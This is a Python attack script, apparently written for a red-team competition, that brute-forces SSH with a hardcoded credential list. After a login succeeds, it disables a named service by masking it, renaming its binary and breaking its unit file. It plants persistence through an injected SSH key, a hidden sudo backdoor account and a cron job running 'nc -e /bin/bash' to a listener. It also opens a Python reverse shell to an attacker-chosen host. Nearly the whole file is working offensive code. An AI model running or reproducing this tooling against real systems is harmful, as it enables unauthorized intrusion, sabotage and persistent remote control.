#!/usr/bin/env python3

import argparse
import os
import sys
import time
import paramiko
import logging
import subprocess
import random
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Default credentials list based on provided information
DEFAULT_CREDENTIALS = [
    # Format: (username, password, permission_level, access_area)
    ("Armorer", "Bl@st_Furn@c3", "user", "Swamp"),
    ("Butcher", "F00d_Smok3r", "user", "Beach"),
    ("Cleric", "8rew1ng_St@nd", "user", "Ocean"),
    ("Farmer", "Comp0st3r_S33ds", "user", "Plains"),
    ("Fisherman", "B@rrel_St0rag3", "user", "Forest"),
    ("Fletcher", "Fl3tch1ng_T@bl3", "user", "Savanna"),
    ("Leatherworker", "C@uldr0n_W@t3r", "user", "Taiga"),
    ("Librarian", "L3ct3rn_B00k", "user", "Jungle"),
    ("Toolsmith", "Sm1th1ng_T@bl3", "user", "Desert"),
    ("Notch", "I_H@t3_Th3_Nether@!", "admin", "All except River"),
    ("Alex", "N3th3r_P1ck@xe!", "Domain User", "River Swamp Beach Ocean"),
    ("Steve", "C@v3_M1n3c@rt_64", "Domain Admin", "River Swamp Beach Ocean"),
    # Skipping accounts marked NOT IN SCOPE
]

def check_dependencies():
    """Check and install required dependencies."""
    required_packages = ['paramiko', 'python3-pip']
    
    logger.info("Checking dependencies...")
    
    # Check if pip is installed
    try:
        subprocess.check_call(["which", "pip3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        logger.info("Installing pip3...")
        subprocess.call(["sudo", "apt", "update"])
        subprocess.call(["sudo", "apt", "install", "-y", "python3-pip"])
    
    # Check and install Python packages
    try:
        import paramiko
    except ImportError:
        logger.info("Installing required Python packages...")
        subprocess.call(["pip3", "install", "paramiko"])
    
    logger.info("All dependencies installed successfully.")

def attempt_ssh_login(host, port, username, password, timeout=5):
    """Attempt SSH login with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout
        )
        logger.info(f"[SUCCESS] Access gained with {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        logger.debug(f"[FAILED] Authentication failed for {username}:{password}")
        return None
    except (paramiko.SSHException, socket.error) as e:
        logger.debug(f"[ERROR] {str(e)} for {username}:{password}")
        return None
    except Exception as e:
        logger.debug(f"[ERROR] Unexpected error: {str(e)}")
        return None

def disable_service(client, service_name):
    """Attempt to disable a service on the target machine."""
    if not client:
        return False
    
    try:
        # Method 1: Mask the service
        logger.info(f"Attempting to mask service: {service_name}")
        stdin, stdout, stderr = client.exec_command(f"sudo systemctl mask {service_name}")
        
        # Method 2: Rename the binary
        logger.info(f"Attempting to locate and rename {service_name} binary")
        stdin, stdout, stderr = client.exec_command(f"which {service_name}")
        binary_path = stdout.read().decode().strip()
        
        if binary_path:
            stdin, stdout, stderr = client.exec_command(f"sudo mv {binary_path} {binary_path}.bak")
            logger.info(f"Renamed {service_name} binary to {binary_path}.bak")
        
        # Method 3: Modify service file
        stdin, stdout, stderr = client.exec_command(f"sudo find /etc/systemd -name '{service_name}*'")
        service_files = stdout.read().decode().strip().split('\n')
        
        for service_file in service_files:
            if service_file:
                logger.info(f"Found service file: {service_file}")
                # Add an invalid ExecStart line that will prevent service from starting
                stdin, stdout, stderr = client.exec_command(f"sudo sh -c 'echo \"ExecStart=/bin/false\" >> {service_file}'")
        
        # Reload systemd
        stdin, stdout, stderr = client.exec_command("sudo systemctl daemon-reload")
        
        logger.info(f"Service {service_name} should be disabled now")
        return True
        
    except Exception as e:
        logger.error(f"Failed to disable service: {str(e)}")
        return False

def establish_persistence(client, username):
    """Establish persistence on the target machine."""
    if not client:
        return False
    
    try:
        # Method 1: Create SSH authorized_keys entry
        logger.info("Attempting to establish SSH key persistence")
        
        # Generate a new SSH key pair locally
        key_filename = f"/tmp/id_rsa_{random.randint(1000,9999)}"
        subprocess.call(["ssh-keygen", "-t", "rsa", "-b", "2048", "-f", key_filename, "-N", ""])
        
        with open(f"{key_filename}.pub", "r") as f:
            public_key = f.read().strip()
        
        # Add to authorized_keys on target
        stdin, stdout, stderr = client.exec_command(f"mkdir -p ~/.ssh")
        stdin, stdout, stderr = client.exec_command(f"echo '{public_key}' >> ~/.ssh/authorized_keys")
        stdin, stdout, stderr = client.exec_command(f"chmod 600 ~/.ssh/authorized_keys")
        
        logger.info(f"SSH key persistence established. Private key saved to {key_filename}")
        
        # Method 2: Create a hidden user if we have admin rights
        if username in ["Notch", "Steve"]:  # Known admin users
            logger.info("Attempting to create a backdoor user")
            hidden_user = f"maint{random.randint(100,999)}"
            hidden_pass = f"M@int{random.randint(1000,9999)}!"
            
            stdin, stdout, stderr = client.exec_command(f"sudo useradd -m -s /bin/bash {hidden_user}")
            stdin, stdout, stderr = client.exec_command(f"echo '{hidden_user}:{hidden_pass}' | sudo chpasswd")
            stdin, stdout, stderr = client.exec_command(f"sudo usermod -aG sudo {hidden_user}")
            
            logger.info(f"Backdoor user created: {hidden_user}:{hidden_pass}")
        
        # Method 3: Create a cron job for persistence
        cron_cmd = f"* * * * * nc -e /bin/bash {args.lhost if 'args' in locals() else '127.0.0.1'} {args.lport if 'args' in locals() else '4444'} 2>/dev/null"
        stdin, stdout, stderr = client.exec_command(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -")
        
        logger.info("Cron job persistence established")
        return True
        
    except Exception as e:
        logger.error(f"Failed to establish persistence: {str(e)}")
        return False

def brute_force_ssh(args):
    """Main function to perform SSH brute force attack."""
    target_host = args.target
    target_port = args.port
    
    # If custom credentials are provided, use them
    credentials_to_try = []
    if args.username and args.password:
        credentials_to_try = [(args.username, args.password, "custom", "custom")]
    else:
        credentials_to_try = DEFAULT_CREDENTIALS
    
    logger.info(f"Starting SSH brute force against {target_host}:{target_port}")
    logger.info(f"Using {len(credentials_to_try)} credential pairs")
    
    successful_client = None
    successful_username = None
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for username, password, perm, access in credentials_to_try:
            # Slight delay to avoid overwhelming the target
            time.sleep(0.5)
            futures.append(executor.submit(attempt_ssh_login, target_host, target_port, username, password))
        
        for i, future in enumerate(futures):
            client = future.result()
            if client:
                successful_client = client
                successful_username = credentials_to_try[i][0]
                break
    
    if successful_client:
        logger.info(f"Successfully compromised target with username: {successful_username}")
        
        # If service disabling is requested
        if args.disable_service:
            disable_service(successful_client, args.disable_service)
        
        # Establish persistence
        if args.persistence:
            establish_persistence(successful_client, successful_username)
            
        # If a reverse shell is requested
        if args.lhost and args.lport:
            try:
                logger.info(f"Attempting to establish reverse shell to {args.lhost}:{args.lport}")
                cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{args.lhost}\",{args.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
                stdin, stdout, stderr = successful_client.exec_command(cmd)
                logger.info("Reverse shell command executed")
            except Exception as e:
                logger.error(f"Failed to establish reverse shell: {str(e)}")
        
        return True
    else:
        logger.info("No successful login found")
        return False

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool for Red Team Competition")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--username", help="Specific username to try")
    parser.add_argument("-pw", "--password", help="Specific password to try")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads for brute forcing")
    parser.add_argument("-d", "--disable-service", help="Name of service to disable after compromise")
    parser.add_argument("-lh", "--lhost", help="Listener IP for reverse shell")
    parser.add_argument("-lp", "--lport", type=int, help="Listener port for reverse shell")
    parser.add_argument("-P", "--persistence", action="store_true", help="Establish persistence on the target")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Check and install dependencies
    check_dependencies()
    
    # Start the brute force attack
    success = brute_force_ssh(args)
    
    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    import socket
    main()
